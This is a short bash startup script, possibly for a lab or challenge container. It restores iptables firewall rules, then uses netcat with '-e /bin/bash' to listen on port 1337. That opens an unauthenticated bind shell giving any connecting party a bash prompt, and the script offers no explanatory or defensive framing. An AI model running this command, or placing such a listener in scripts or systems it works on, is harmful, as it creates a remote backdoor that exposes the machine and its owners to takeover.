#!/bin/bash
iptables-restore < /etc/iptables/rules.v4
su user -c "nc -lvp 1337 -e /bin/bash"
